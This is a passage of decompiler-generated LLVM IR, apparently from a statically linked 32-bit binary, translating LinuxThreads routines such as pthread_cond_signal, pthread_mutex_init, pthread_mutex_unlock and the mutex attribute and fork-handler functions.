  uselistorder i32 %v2_8059147, { 6, 7, 8, 1, 4, 5, 3, 9, 2, 11, 10, 12, 13, 0 }
  uselistorder i32 %v4_8059143, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 2, 3, 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder i32 (i32, i32)* @__pthread_do_exit, { 4, 9, 8, 0, 7, 3, 11, 6, 5, 10, 2, 1 }
  uselistorder i32 ()* @suspend.18, { 1, 0, 2 }
  uselistorder i32 440, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if.15, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8059272, { 1, 0 }
  uselistorder label %dec_label_pc_805925e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805924b, { 1, 0 }
  uselistorder label %dec_label_pc_80591ff, { 1, 0 }
  uselistorder label %dec_label_pc_80591bf, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805927d = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg1, i32* @eax, align 4
  %v1_8059289 = call i32 @__pthread_lock(i32 %v0_805927d)
  %v0_805928e = load i32, i32* @esi, align 4
  %v1_805928e = add i32 %v0_805928e, 8
  %v2_805928e = inttoptr i32 %v1_805928e to i32*
  %v3_805928e = load i32, i32* %v2_805928e, align 4
  store i32 %v3_805928e, i32* @ebx, align 4
  %v1_8059291 = icmp eq i32 %v3_805928e, 0
  br i1 %v1_8059291, label %dec_label_pc_80592a2, label %dec_label_pc_8059295

dec_label_pc_8059295:                             ; preds = %entry
  %v1_8059295 = add i32 %v3_805928e, 8
  %v2_8059295 = inttoptr i32 %v1_8059295 to i32*
  %v3_8059295 = load i32, i32* %v2_8059295, align 4
  store i32 %v3_8059295, i32* %v2_805928e, align 4
  store i32 0, i32* %v2_8059295, align 4
  %v0_80592a5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80592a2

dec_label_pc_80592a2:                             ; preds = %entry, %dec_label_pc_8059295
  %v0_80592a5 = phi i32 [ %v0_805928e, %entry ], [ %v0_80592a5.pre, %dec_label_pc_8059295 ]
  %v1_80592a6 = inttoptr i32 %v0_80592a5 to i32*
  %v2_80592a6 = call i32 @__pthread_unlock(i32* %v1_80592a6)
  br i1 %v1_8059291, label %dec_label_pc_80592c0, label %dec_label_pc_80592b2

dec_label_pc_80592b2:                             ; preds = %dec_label_pc_80592a2
  %v1_80592b2 = add i32 %v3_805928e, 441
  %v2_80592b2 = inttoptr i32 %v1_80592b2 to i8*
  store i8 1, i8* %v2_80592b2, align 1
  store i32 %v3_805928e, i32* @eax, align 4
  %v0_80592bb = call i32 @restart.16()
  br label %dec_label_pc_80592c0

dec_label_pc_80592c0:                             ; preds = %dec_label_pc_80592a2, %dec_label_pc_80592b2
  ret i32 0

; uselistorder directives
  uselistorder i1 %v1_8059291, { 1, 0 }
  uselistorder i32 %v3_805928e, { 1, 2, 0, 3, 4 }
  uselistorder i32 ()* @restart.16, { 3, 0, 2, 1 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80592c0, { 1, 0 }
  uselistorder label %dec_label_pc_80592a2, { 1, 0 }
}

define i32 @__linuxthreads_create_event() local_unnamed_addr {
entry:
  %v0_80592c8 = load i32, i32* @eax, align 4
  ret i32 %v0_80592c8
}

define i32 @__linuxthreads_death_event() local_unnamed_addr {
entry:
  %v0_80592c9 = load i32, i32* @eax, align 4
  ret i32 %v0_80592c9
}

define i32 @__linuxthreads_reap_event() local_unnamed_addr {
entry:
  %v0_80592ca = load i32, i32* @eax, align 4
  ret i32 %v0_80592ca
}

define i32 @__fresetlockfiles() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_80592d0 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_80592d0, i32* %ebx.global-to-local, align 4
  %v2_80592d5 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-8)
  %v3_80592df = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-8, i32 1)
  %storemerge8 = load i32, i32* bitcast (i32** @global_var_8073d7c.702 to i32*), align 4
  store i32 %storemerge8, i32* %ebx.global-to-local, align 4
  %v1_80592fe9 = icmp eq i32 %storemerge8, 0
  %v1_805930410 = icmp eq i1 %v1_80592fe9, false
  br i1 %v1_805930410, label %dec_label_pc_80592ec, label %dec_label_pc_8059306

dec_label_pc_80592ec:                             ; preds = %entry, %dec_label_pc_80592ec
  %storemerge11 = phi i32 [ %storemerge, %dec_label_pc_80592ec ], [ %storemerge8, %entry ]
  %v1_80592ef = add i32 %storemerge11, 56
  %v3_80592f3 = call i32 @pthread_mutex_init(i32 %v1_80592ef, i32* nonnull %stack_var_-8)
  %v0_80592f8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80592f8 = add i32 %v0_80592f8, 32
  %v2_80592f8 = inttoptr i32 %v1_80592f8 to i32*
  %storemerge = load i32, i32* %v2_80592f8, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_80592fe = icmp eq i32 %storemerge, 0
  %v1_8059304 = icmp eq i1 %v1_80592fe, false
  br i1 %v1_8059304, label %dec_label_pc_80592ec, label %dec_label_pc_8059306

dec_label_pc_8059306:                             ; preds = %dec_label_pc_80592ec, %entry
  %v1_805930a = call i32 @pthread_mutexattr_destroy(i32 %v2_80592d0)
  ret i32 %v1_805930a

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 (i32)* @pthread_mutexattr_destroy, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80592ec, { 1, 0 }
}

define i32 @__pthread_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059314 = load i32, i32* @ebx, align 4
  store i32 %v0_8059314, i32* %stack_var_-4, align 4
  %v0_8059315 = load i32, i32* @eax, align 4
  store i32 %v0_8059315, i32* %ecx.global-to-local, align 4
  %v1_805931a10 = inttoptr i32 %v0_8059315 to i32*
  %v2_805931a11 = load i32, i32* %v1_805931a10, align 4
  %v3_805931a12 = icmp eq i32 %v2_805931a11, 0
  br i1 %v3_805931a12, label %dec_label_pc_8059326, label %dec_label_pc_805933c

dec_label_pc_8059326:                             ; preds = %entry, %dec_label_pc_8059326.dec_label_pc_805931a_crit_edge
  %v1_805931a13 = phi i32* [ %v1_805931a, %dec_label_pc_8059326.dec_label_pc_805931a_crit_edge ], [ %v1_805931a10, %entry ]
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_805932f = load i32, i32* %v1_805931a13, align 4
  %v15_805932f = icmp eq i32 %v2_805932f, 0
  %v22_805932f = select i1 %v15_805932f, i32 1, i32 %v2_805932f
  store i32 %v22_805932f, i32* %v1_805931a13, align 4
  %v1_8059333 = zext i1 %v15_805932f to i32
  %v2_8059333 = load i32, i32* %edx.global-to-local, align 4
  %v3_8059333 = and i32 %v2_8059333, -256
  %v4_8059333 = or i32 %v3_8059333, %v1_8059333
  store i32 %v4_8059333, i32* %edx.global-to-local, align 4
  %v4_8059336 = icmp eq i1 %v15_805932f, false
  br i1 %v4_8059336, label %dec_label_pc_8059326.dec_label_pc_805931a_crit_edge, label %dec_label_pc_805933a

dec_label_pc_8059326.dec_label_pc_805931a_crit_edge: ; preds = %dec_label_pc_8059326
  %v0_805931a.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_805931a = inttoptr i32 %v0_805931a.pre to i32*
  %v2_805931a = load i32, i32* %v1_805931a, align 4
  %v3_805931a = icmp eq i32 %v2_805931a, 0
  br i1 %v3_805931a, label %dec_label_pc_8059326, label %dec_label_pc_805933c

dec_label_pc_805933a:                             ; preds = %dec_label_pc_8059326
  br label %dec_label_pc_805933c

dec_label_pc_805933c:                             ; preds = %entry, %dec_label_pc_8059326.dec_label_pc_805931a_crit_edge, %dec_label_pc_805933a
  %storemerge = phi i32 [ 0, %dec_label_pc_805933a ], [ 16, %dec_label_pc_8059326.dec_label_pc_805931a_crit_edge ], [ 16, %entry ]
  %v2_805933c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805933c, i32* @edx, align 4
  %v2_805933d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805933d, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_805931a, { 1, 0 }
  uselistorder i1 %v15_805932f, { 1, 0, 2 }
  uselistorder i32 %v2_805932f, { 1, 0 }
  uselistorder i32* %v1_805931a13, { 1, 0 }
  uselistorder label %dec_label_pc_805933c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059326, { 1, 0 }
}

define i32 @__pthread_alt_trylock(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805933f = load i32, i32* @ebx, align 4
  store i32 %v0_805933f, i32* %stack_var_-4, align 4
  %v0_8059340 = load i32, i32* @eax, align 4
  store i32 %v0_8059340, i32* %ecx.global-to-local, align 4
  %v1_805934510 = inttoptr i32 %v0_8059340 to i32*
  %v2_805934511 = load i32, i32* %v1_805934510, align 4
  %v3_805934512 = icmp eq i32 %v2_805934511, 0
  br i1 %v3_805934512, label %dec_label_pc_8059351, label %dec_label_pc_8059367

dec_label_pc_8059351:                             ; preds = %entry, %dec_label_pc_8059351.dec_label_pc_8059345_crit_edge
  %v1_805934513 = phi i32* [ %v1_8059345, %dec_label_pc_8059351.dec_label_pc_8059345_crit_edge ], [ %v1_805934510, %entry ]
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_805935a = load i32, i32* %v1_805934513, align 4
  %v15_805935a = icmp eq i32 %v2_805935a, 0
  %v22_805935a = select i1 %v15_805935a, i32 1, i32 %v2_805935a
  store i32 %v22_805935a, i32* %v1_805934513, align 4
  %v1_805935e = zext i1 %v15_805935a to i32
  %v2_805935e = load i32, i32* %edx.global-to-local, align 4
  %v3_805935e = and i32 %v2_805935e, -256
  %v4_805935e = or i32 %v3_805935e, %v1_805935e
  store i32 %v4_805935e, i32* @edx, align 4
  %v4_8059361 = icmp eq i1 %v15_805935a, false
  br i1 %v4_8059361, label %dec_label_pc_8059351.dec_label_pc_8059345_crit_edge, label %dec_label_pc_8059365

dec_label_pc_8059351.dec_label_pc_8059345_crit_edge: ; preds = %dec_label_pc_8059351
  %v0_8059345.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8059345 = inttoptr i32 %v0_8059345.pre to i32*
  %v2_8059345 = load i32, i32* %v1_8059345, align 4
  %v3_8059345 = icmp eq i32 %v2_8059345, 0
  br i1 %v3_8059345, label %dec_label_pc_8059351, label %dec_label_pc_8059367

dec_label_pc_8059365:                             ; preds = %dec_label_pc_8059351
  br label %dec_label_pc_8059367

dec_label_pc_8059367:                             ; preds = %entry, %dec_label_pc_8059351.dec_label_pc_8059345_crit_edge, %dec_label_pc_8059365
  %storemerge = phi i32 [ 0, %dec_label_pc_8059365 ], [ 16, %dec_label_pc_8059351.dec_label_pc_8059345_crit_edge ], [ 16, %entry ]
  %v2_8059367 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059367, i32* %ecx.global-to-local, align 4
  %v2_8059368 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059368, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_8059345, { 1, 0 }
  uselistorder i1 %v15_805935a, { 1, 0, 2 }
  uselistorder i32 %v2_805935a, { 1, 0 }
  uselistorder i32* %v1_805934513, { 1, 0 }
  uselistorder label %dec_label_pc_8059367, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059351, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %tmp2, i32* @ecx, align 4
  store i32 3, i32* %edx.global-to-local, align 4
  %v1_8059377 = icmp eq i32* %arg2, null
  %v1_8059379 = add i32 %arg1, 16
  %v2_8059379 = inttoptr i32 %v1_8059379 to i32*
  store i32 0, i32* %v2_8059379, align 4
  %v0_8059380 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059380 = add i32 %v0_8059380, 20
  %v2_8059380 = inttoptr i32 %v1_8059380 to i32*
  store i32 0, i32* %v2_8059380, align 4
  br i1 %v1_8059377, label %entry.dec_label_pc_805938b_crit_edge, label %dec_label_pc_8059389

entry.dec_label_pc_805938b_crit_edge:             ; preds = %entry
  %v0_805938b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805938b

dec_label_pc_8059389:                             ; preds = %entry
  %v2_8059389 = load i32, i32* %arg2, align 4
  store i32 %v2_8059389, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805938b

dec_label_pc_805938b:                             ; preds = %entry.dec_label_pc_805938b_crit_edge, %dec_label_pc_8059389
  %v0_805938b = phi i32 [ %v0_805938b.pre, %entry.dec_label_pc_805938b_crit_edge ], [ %v2_8059389, %dec_label_pc_8059389 ]
  %v1_805938b = load i32, i32* %eax.global-to-local, align 4
  %v2_805938b = add i32 %v1_805938b, 12
  %v3_805938b = inttoptr i32 %v2_805938b to i32*
  store i32 %v0_805938b, i32* %v3_805938b, align 4
  %v0_805938e = load i32, i32* %eax.global-to-local, align 4
  %v1_805938e = add i32 %v0_805938e, 4
  %v2_805938e = inttoptr i32 %v1_805938e to i32*
  store i32 0, i32* %v2_805938e, align 4
  %v0_8059395 = load i32, i32* %eax.global-to-local, align 4
  %v1_8059395 = add i32 %v0_8059395, 8
  %v2_8059395 = inttoptr i32 %v1_8059395 to i32*
  store i32 0, i32* %v2_8059395, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_805938b, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_80593a3 = add i32 %arg1, 12
  %v2_80593a3 = inttoptr i32 %v1_80593a3 to i32*
  %v3_80593a3 = load i32, i32* %v2_80593a3, align 4
  %v2_80593a6 = icmp slt i32 %v3_80593a3, 0
  br i1 %v2_80593a6, label %dec_label_pc_80593b4, label %dec_label_pc_80593aa

dec_label_pc_80593aa:                             ; preds = %entry
  %v7_80593ad = icmp sgt i32 %v3_80593a3, 1
  br i1 %v7_80593ad, label %dec_label_pc_80593af, label %dec_label_pc_80593ba

dec_label_pc_80593af:                             ; preds = %dec_label_pc_80593aa
  %v7_80593b2 = icmp sgt i32 %v3_80593a3, 3
  br i1 %v7_80593b2, label %dec_label_pc_80593b4, label %dec_label_pc_80593c4

dec_label_pc_80593b4:                             ; preds = %dec_label_pc_80593af, %entry
  ret i32 22

dec_label_pc_80593ba:                             ; preds = %dec_label_pc_80593aa
  %v1_80593ba = add i32 %arg1, 16
  %v2_80593ba = inttoptr i32 %v1_80593ba to i8*
  %v3_80593ba = load i8, i8* %v2_80593ba, align 1
  %v4_80593ba = urem i8 %v3_80593ba, 2
  %v5_80593ba = icmp eq i8 %v4_80593ba, 0
  br i1 %v5_80593ba, label %dec_label_pc_80593cc, label %dec_label_pc_80593c6

dec_label_pc_80593c4:                             ; preds = %dec_label_pc_80593af
  %v1_80593c0 = add i32 %arg1, 16
  %v2_80593c0 = inttoptr i32 %v1_80593c0 to i32*
  %v3_80593c0 = load i32, i32* %v2_80593c0, align 4
  %v4_80593c0 = icmp eq i32 %v3_80593c0, 0
  br i1 %v4_80593c0, label %dec_label_pc_80593cc, label %dec_label_pc_80593c6

dec_label_pc_80593c6:                             ; preds = %dec_label_pc_80593ba, %dec_label_pc_80593c4
  ret i32 16

dec_label_pc_80593cc:                             ; preds = %dec_label_pc_80593ba, %dec_label_pc_80593c4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_80593cc, { 1, 0 }
  uselistorder label %dec_label_pc_80593c6, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_80593eb = icmp ugt i32 %arg2, 3
  br i1 %v6_80593eb, label %dec_label_pc_80593f5, label %dec_label_pc_80593ed

dec_label_pc_80593ed:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_80593f5

dec_label_pc_80593f5:                             ; preds = %entry, %dec_label_pc_80593ed
  %v0_80593f5 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_80593ed ]
  ret i32 %v0_80593f5

; uselistorder directives
  uselistorder label %dec_label_pc_80593f5, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_80593fa = load i32, i32* %arg1, align 4
  %v2_8059400 = inttoptr i32 %arg2 to i32*
  store i32 %v2_80593fa, i32* %v2_8059400, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp2 = or i32 %arg1, 1
  %tmp3 = icmp eq i32 %tmp2, 1
  br i1 %tmp3, label %dec_label_pc_8059420, label %dec_label_pc_8059427

dec_label_pc_8059420:                             ; preds = %entry
  br label %dec_label_pc_8059427

dec_label_pc_8059427:                             ; preds = %entry, %dec_label_pc_8059420
  %v0_8059427 = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_8059420 ]
  ret i32 %v0_8059427

; uselistorder directives
  uselistorder label %dec_label_pc_8059427, { 1, 0 }
}

define i32 @__pthread_once_fork_child() local_unnamed_addr {
entry:
  %v3_8059432 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_807a63c.713 to i32), i32* null)
  %v3_805943e = call i32 @pthread_cond_init(i32* nonnull @global_var_807a654.714, i32 0)
  %v0_8059443 = load i32, i32* @global_var_807a660.715, align 32
  %v1_805944b = add i32 %v0_8059443, -2147483643
  %v6_805944b = sub i32 2147483642, %v0_8059443
  %v7_805944b = and i32 %v6_805944b, %v0_8059443
  %v8_805944b = icmp slt i32 %v7_805944b, 0
  %v9_805944b = icmp eq i32 %v1_805944b, 0
  %v10_805944b = icmp slt i32 %v1_805944b, 0
  %v3_8059450 = icmp eq i1 %v10_805944b, %v8_805944b
  %v4_8059450 = icmp eq i1 %v9_805944b, false
  %v5_8059450 = and i1 %v4_8059450, %v3_8059450
  br i1 %v5_8059450, label %dec_label_pc_8059466, label %dec_label_pc_8059452

dec_label_pc_8059452:                             ; preds = %entry
  %v1_8059452 = add i32 %v0_8059443, 4
  br label %dec_label_pc_8059466

dec_label_pc_8059466:                             ; preds = %entry, %dec_label_pc_8059452
  %storemerge = phi i32 [ %v1_8059452, %dec_label_pc_8059452 ], [ 0, %entry ]
  %v0_8059469 = phi i32 [ %v1_8059452, %dec_label_pc_8059452 ], [ %v0_8059443, %entry ]
  store i32 %storemerge, i32* @global_var_807a660.715, align 32
  ret i32 %v0_8059469

; uselistorder directives
  uselistorder i32 %v1_805944b, { 1, 0 }
  uselistorder i32 %v0_8059443, { 1, 2, 0, 4, 3 }
  uselistorder label %dec_label_pc_8059466, { 1, 0 }
}

define i32 @thread_self.19(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_805946a = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_805946a, i32* @edx, align 4
  %v0_8059471 = load i32, i32* @esp, align 4
  %v1_8059471 = load i32, i32* @global_var_807a620.650, align 32
  %v7_8059471 = icmp ult i32 %v0_8059471, %v1_8059471
  %v1_8059477 = icmp eq i1 %v7_8059471, false
  br i1 %v1_8059477, label %dec_label_pc_80594a8, label %dec_label_pc_8059479

dec_label_pc_8059479:                             ; preds = %entry
  %v1_8059479 = load i32, i32* @global_var_807a624.651, align 4
  %v7_8059479 = icmp ult i32 %v0_8059471, %v1_8059479
  br i1 %v7_8059479, label %dec_label_pc_805948e, label %dec_label_pc_8059481

dec_label_pc_8059481:                             ; preds = %dec_label_pc_8059479
  %v1_8059486 = load i32, i32* @global_var_807a628.653, align 8
  %v7_8059486 = icmp ult i32 %v0_8059471, %v1_8059486
  br i1 %v7_8059486, label %dec_label_pc_80594a8, label %dec_label_pc_805948e

dec_label_pc_805948e:                             ; preds = %dec_label_pc_8059481, %dec_label_pc_8059479
  %v0_805948e = load i32, i32* @global_var_807e100.654, align 256
  %v1_805948e = icmp eq i32 %v0_805948e, 0
  br i1 %v1_805948e, label %dec_label_pc_805949c, label %dec_label_pc_8059497

dec_label_pc_8059497:                             ; preds = %dec_label_pc_805948e
  %v0_8059497 = call i32 @__pthread_find_self()
  br label %dec_label_pc_805949c

dec_label_pc_805949c:                             ; preds = %dec_label_pc_805948e, %dec_label_pc_8059497
  %v3_805949c = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_805949c, i32* @edx, align 4
  %v2_80594a2 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_80594a8

dec_label_pc_80594a8:                             ; preds = %dec_label_pc_8059481, %entry, %dec_label_pc_805949c
  %v0_80594a8 = phi i32 [ ptrtoint (i32* @global_var_8073aa0.652 to i32), %dec_label_pc_8059481 ], [ ptrtoint (i32* @global_var_80738c0 to i32), %entry ], [ %v2_80594a2, %dec_label_pc_805949c ]
  ret i32 %v0_80594a8

; uselistorder directives
  uselistorder label %dec_label_pc_80594a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805949c, { 1, 0 }
}

define i32 @pthread_mutex_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80594a9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80594b1 = add i32 %arg1, 12
  %v2_80594b1 = inttoptr i32 %v1_80594b1 to i32*
  %v3_80594b1 = load i32, i32* %v2_80594b1, align 4
  %v1_80594b4 = add i32 %v3_80594b1, -1
  %v5_80594b4 = icmp eq i32 %v3_80594b1, 0
  %v9_80594b4 = icmp eq i32 %v1_80594b4, 0
  br i1 %v9_80594b4, label %dec_label_pc_80594d2, label %dec_label_pc_80594b9

dec_label_pc_80594b9:                             ; preds = %entry
  %v6_80594b4 = sub i32 0, %v3_80594b1
  %v7_80594b4 = and i32 %v3_80594b1, %v6_80594b4
  %v8_80594b4 = icmp slt i32 %v7_80594b4, 0
  %v10_80594b4 = icmp slt i32 %v1_80594b4, 0
  %v3_80594b9 = icmp eq i1 %v10_80594b4, %v8_80594b4
  br i1 %v3_80594b9, label %dec_label_pc_80594c1, label %dec_label_pc_80594bb

dec_label_pc_80594bb:                             ; preds = %dec_label_pc_80594b9
  br i1 %v5_80594b4, label %dec_label_pc_80594f2, label %dec_label_pc_80594cb

dec_label_pc_80594c1:                             ; preds = %dec_label_pc_80594b9
  %v9_80594c1 = icmp eq i32 %v3_80594b1, 2
  br i1 %v9_80594c1, label %dec_label_pc_8059505, label %dec_label_pc_80594c6

dec_label_pc_80594c6:                             ; preds = %dec_label_pc_80594c1
  %v9_80594c6 = icmp eq i32 %v3_80594b1, 3
  br i1 %v9_80594c6, label %dec_label_pc_805951c, label %dec_label_pc_80594cb

dec_label_pc_80594cb:                             ; preds = %dec_label_pc_80594bb, %dec_label_pc_80594c6
  br label %dec_label_pc_805952f

dec_label_pc_80594d2:                             ; preds = %entry
  %v1_80594d2 = call i32 @thread_self.19(i32 %v0_80594a9)
  %v0_80594d7 = load i32, i32* @ebx, align 4
  %v1_80594d7 = add i32 %v0_80594d7, 8
  %v2_80594d7 = inttoptr i32 %v1_80594d7 to i32*
  %v3_80594d7 = load i32, i32* %v2_80594d7, align 4
  %v15_80594d7 = icmp eq i32 %v3_80594d7, %v1_80594d2
  %v1_80594da = icmp eq i1 %v15_80594d7, false
  br i1 %v1_80594da, label %dec_label_pc_805952a, label %dec_label_pc_80594dc

dec_label_pc_80594dc:                             ; preds = %dec_label_pc_80594d2
  %v1_80594dc = add i32 %v0_80594d7, 4
  %v2_80594dc = inttoptr i32 %v1_80594dc to i32*
  %v3_80594dc = load i32, i32* %v2_80594dc, align 4
  %tmp12 = icmp slt i32 %v3_80594dc, 1
  br i1 %tmp12, label %dec_label_pc_80594eb, label %dec_label_pc_80594e3

dec_label_pc_80594e3:                             ; preds = %dec_label_pc_80594dc
  %v1_80594e3 = add i32 %v3_80594dc, -1
  store i32 %v1_80594e3, i32* %v2_80594dc, align 4
  br label %dec_label_pc_805952f

dec_label_pc_80594eb:                             ; preds = %dec_label_pc_80594dc
  store i32 0, i32* %v2_80594d7, align 4
  %v0_80594f5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80594f2

dec_label_pc_80594f2:                             ; preds = %dec_label_pc_80594bb, %dec_label_pc_80594eb
  %v0_80594f5 = phi i32 [ %arg1, %dec_label_pc_80594bb ], [ %v0_80594f5.pre, %dec_label_pc_80594eb ]
  %v1_80594f5 = add i32 %v0_80594f5, 16
  %v1_80594f9 = inttoptr i32 %v1_80594f5 to i32*
  %v2_80594f9 = call i32 @__pthread_unlock(i32* %v1_80594f9)
  br label %dec_label_pc_80594fe

dec_label_pc_80594fe:                             ; preds = %dec_label_pc_805951c, %dec_label_pc_80594f2
  br label %dec_label_pc_805952f

dec_label_pc_8059505:                             ; preds = %dec_label_pc_80594c1
  %v1_8059505 = call i32 @thread_self.19(i32 %v0_80594a9)
  %v0_805950a = load i32, i32* @ebx, align 4
  %v1_805950a = add i32 %v0_805950a, 8
  %v2_805950a = inttoptr i32 %v1_805950a to i32*
  %v3_805950a = load i32, i32* %v2_805950a, align 4
  %v15_805950a = icmp eq i32 %v3_805950a, %v1_8059505
  %v1_805950d = icmp eq i1 %v15_805950a, false
  br i1 %v1_805950d, label %dec_label_pc_805952a, label %dec_label_pc_805950f

dec_label_pc_805950f:                             ; preds = %dec_label_pc_8059505
  %v1_805950f = add i32 %v0_805950a, 16
  %v2_805950f = inttoptr i32 %v1_805950f to i32*
  %v3_805950f = load i32, i32* %v2_805950f, align 4
  %v4_805950f = icmp eq i32 %v3_805950f, 0
  br i1 %v4_805950f, label %dec_label_pc_805952a, label %dec_label_pc_8059515

dec_label_pc_8059515:                             ; preds = %dec_label_pc_805950f
  store i32 0, i32* %v2_805950a, align 4
  %v0_805951f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805951c

dec_label_pc_805951c:                             ; preds = %dec_label_pc_80594c6, %dec_label_pc_8059515
  %v0_805951f = phi i32 [ %arg1, %dec_label_pc_80594c6 ], [ %v0_805951f.pre, %dec_label_pc_8059515 ]
  %v1_805951f = add i32 %v0_805951f, 16
  %v1_8059523 = inttoptr i32 %v1_805951f to i32*
  %v2_8059523 = call i32 @__pthread_alt_unlock(i32* %v1_8059523)
  br label %dec_label_pc_80594fe

dec_label_pc_805952a:                             ; preds = %dec_label_pc_805950f, %dec_label_pc_8059505, %dec_label_pc_80594d2
  br label %dec_label_pc_805952f

dec_label_pc_805952f:                             ; preds = %dec_label_pc_80594fe, %dec_label_pc_80594e3, %dec_label_pc_80594cb, %dec_label_pc_805952a
  %v0_8059532 = phi i32 [ 0, %dec_label_pc_80594fe ], [ 0, %dec_label_pc_80594e3 ], [ 22, %dec_label_pc_80594cb ], [ 1, %dec_label_pc_805952a ]
  store i32 %v0_80594a9, i32* @ebx, align 4
  ret i32 %v0_8059532

; uselistorder directives
  uselistorder i32 %v3_80594dc, { 1, 0 }
  uselistorder i32 %v1_80594b4, { 1, 0 }
  uselistorder i32 %v3_80594b1, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_80594a9, { 0, 2, 1 }
  uselistorder i32 (i32*)* @__pthread_unlock, { 50, 7, 38, 8, 9, 3, 37, 39, 10, 11, 12, 13, 14, 15, 16, 17, 36, 42, 40, 41, 18, 19, 20, 21, 22, 23, 24, 26, 27, 4, 28, 25, 29, 0, 1, 2, 31, 30, 5, 32, 33, 34, 35, 43, 44, 46, 47, 48, 49, 6, 45 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805952f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805951c, { 1, 0 }
  uselistorder label %dec_label_pc_80594f2, { 1, 0 }
  uselistorder label %dec_label_pc_80594cb, { 1, 0 }
}

define i32 @__pthread_once_fork_parent() local_unnamed_addr {
entry:
  %v1_805953b = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a63c.713 to i32))
  ret i32 %v1_805953b
}

